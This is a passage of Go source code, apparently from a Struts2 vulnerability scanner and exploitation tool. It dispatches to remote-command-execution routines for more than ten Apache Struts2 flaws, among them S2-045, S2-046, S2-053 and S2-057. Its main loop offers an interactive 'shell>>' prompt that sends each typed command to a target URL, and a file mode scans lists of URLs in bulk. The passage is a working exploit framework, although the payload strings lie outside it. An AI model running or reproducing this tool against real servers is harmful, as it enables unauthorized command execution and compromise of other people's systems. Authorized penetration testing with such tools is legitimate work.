			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-016":
		req, err := postShellCommandExecution(url, shell["struts2-016"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-019":
		req, err := postShellCommandExecution(url, shell["struts2-019"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-devmode":
		req, err := getShellCommandExecution(url, shell["struts2-devmode"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-032":
		req, err := getShellCommandExecution(url, shell["struts2-032"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-033":
		req, err := getShellCommandExecution(url, shell["struts2-033"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-037":
		req, err := getShellCommandExecution(url, shell["struts2-037"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-045":
		req, err := getShellCommandExecution045(url, cmd)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-045-2":
		req, err := getShellCommandExecution0452(url, cmd)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-046":
		req, err := postShellCommandExecution046(url, cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-048":
		req, err := postShellCommandExecution048(url, cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-053":
		req, err := getShellCommandExecution053(url, cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-057":
		req, err := getShellCommandExecution057(url, cmd, "struts2-057-1", header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-057-1"+cmd+"命令执行失败，正在尝试struts2-057-2",err)
			reqs, errs := getShellCommandExecution057(url, cmd, "struts2-057-2", header1)
			if errs != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-057-2"+cmd+"命令执行失败",err)
			}
			fmt.Println(reqs)
			return
		}
		fmt.Println(req)

	default:
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]请输入正确的漏洞名字" + "例如：Struts2Scanner -u " + url + "-n struts2-005")
		os.Exit(0)
	}
}
func menu()  {
	now := time.Now()
	fmt.Printf("\033[1;35m%s\033[0m\n", " ____  _              _           ____      ____                                  ")
	fmt.Printf("\033[1;35m%s\033[0m\n", "/ ___|| |_ _ __ _   _| |_ ___    |___ \\    / ___|  ___ __ _ _ __  _ __   ___ _ __ ")
	fmt.Printf("\033[1;35m%s\033[0m\n", "\\___ \\| __| '__| | | | __/ __|     __) |   \\___ \\ / __/ _` | '_ \\| '_ \\ / _ \\ '__|")
	fmt.Printf("\033[1;35m%s\033[0m\n", " ___) | |_| |  | |_| | |_\\__ \\    / __/     ___) | (_| (_| | | | | | | |  __/ |   ")
	fmt.Printf("\033[1;35m%s\033[0m\n", "|____/ \\__|_|   \\__,_|\\__|___/___|_____|___|____/ \\___\\__,_|_| |_|_| |_|\\___|_|   ")
	fmt.Printf("\033[1;35m%s\033[0m\n", "                            |_____|   |_____|                                     ")
	fmt.Printf("\033[1;35m%d-%02d-%02d %02d:%02d:%02d\033[0m\n", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
}

func main()  {
	flag.Parse()
	menu()
	for {
		switch {
		case URL == "" && NAME == "" && FILE == "":
			fmt.Printf("\033[1;31m%s\033[0m\n","请输入完整信息，例如：Struts2Scanner -u http://127.0.0.1/struts2-showcase/index.action -n struts2-005 或者 Struts2Scanner -f ./test.txt")
			os.Exit(0)

		case URL != "" && NAME == "":
			vulnerabilityScanner(URL)
			os.Exit(0)

		case NAME != "" && URL != "":
			fmt.Printf("%v", "shell>>")
			reader := bufio.NewReader(os.Stdin)
			command, err := reader.ReadString('\n')
			if err != nil {
				fmt.Println(err)
				os.Exit(0)
			}
			cmd := strings.Replace(command, "\n", "", -1)
			if cmd == "exit" {
				 os.Exit(0)
			}
			commandExecution(URL, NAME, cmd)

		case FILE != "":
			fi, err := os.Open(FILE)
			if err != nil {
				fmt.Printf("\033[1;31m%s%v\033[0m\n","请输入正确信息", err)
				os.Exit(0)
			}
			defer fi.Close()

			br := bufio.NewReader(fi)
			for {
				url, _, eof := br.ReadLine()
				fmt.Printf("\033[1;35m%s\033[0m\n", string(url))
				if eof == io.EOF {
					break
				}
				vulnerabilityScanner(string(url))
			}
			os.Exit(0)

		default:
			fmt.Printf("\033[1;31m%s\033[0m\n","请输入完整信息，例如：Struts2Scanner -u http://127.0.0.1/struts2-showcase/index.action -n struts2-005")
			os.Exit(0)
		}
	}
}